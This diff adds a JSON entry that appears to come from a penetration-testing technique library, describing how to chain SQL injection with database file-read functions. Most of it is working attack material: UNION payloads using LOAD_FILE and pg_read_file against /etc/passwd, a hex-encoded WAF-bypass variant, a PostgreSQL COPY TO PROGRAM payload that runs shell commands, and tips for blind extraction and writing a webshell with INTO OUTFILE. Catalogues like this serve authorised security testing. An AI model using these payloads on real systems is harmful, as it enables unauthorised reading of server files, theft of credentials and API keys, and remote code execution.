@@ -1,0 +1,60 @@
+{
+  "id": "injection-sqli-file-read",
+  "title": "SQL Injection to File System Read",
+  "category": "injection",
+  "tags": ["sqli", "file-read", "data-exfiltration", "mysql", "postgresql"],
+  "applicability": {
+    "technologies": ["mysql", "postgresql", "mssql", "php", "node", "python", "java"],
+    "contexts": ["api-endpoint", "search-parameter", "url-parameter", "form-input"],
+    "preconditions": ["sql-injection", "file-read-privileges"]
+  },
+  "technique": {
+    "summary": "Chain SQL injection with database file-read functions to read arbitrary files from the server filesystem, including application source code, configuration files with credentials, and /etc/passwd.",
+    "steps": [
+      "Confirm SQL injection exists (boolean-based, union-based, or error-based)",
+      "Determine the database type (MySQL, PostgreSQL, MSSQL)",
+      "Identify the number of columns in the original query (for UNION-based)",
+      "MySQL: Use LOAD_FILE('/etc/passwd') in a UNION SELECT",
+      "PostgreSQL: Use pg_read_file('/etc/passwd') or COPY ... FROM",
+      "MSSQL: Use OPENROWSET(BULK '/etc/passwd', SINGLE_CLOB)",
+      "Escalate: Read application config files for database credentials, API keys"
+    ],
+    "payloads": [
+      {
+        "payload": "' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -",
+        "encoding": "raw",
+        "context": "sql-string",
+        "notes": "MySQL file read via UNION injection"
+      },
+      {
+        "payload": "' UNION SELECT 1,pg_read_file('/etc/passwd'),3-- -",
+        "encoding": "raw",
+        "context": "sql-string",
+        "notes": "PostgreSQL file read"
+      },
+      {
+        "payload": "' UNION SELECT 1,LOAD_FILE(0x2F6574632F706173737764),3-- -",
+        "encoding": "raw",
+        "context": "sql-string",
+        "notes": "MySQL — hex-encoded path to bypass WAF"
+      },
+      {
+        "payload": "1'; COPY (SELECT '') TO PROGRAM 'cat /etc/passwd > /tmp/out.txt';--",
+        "encoding": "raw",
+        "context": "sql-string",
+        "notes": "PostgreSQL COPY TO PROGRAM — can lead to RCE"
+      }
+    ],
+    "bypassTechniques": [
+      "Hex-encode file paths to bypass WAF keyword filtering",
+      "Use CHAR() function to construct strings without quotes",
+      "Time-based blind extraction: IF(SUBSTRING(LOAD_FILE(...),1,1)='r',SLEEP(5),0)",
+      "Use INTO OUTFILE to write webshell if write permissions exist"
+    ]
+  },
+  "references": [
+    "https://portswigger.net/web-security/sql-injection",
+    "https://book.hacktricks.xyz/pentesting-web/sql-injection"
+  ],
+  "source": "manual"
+}
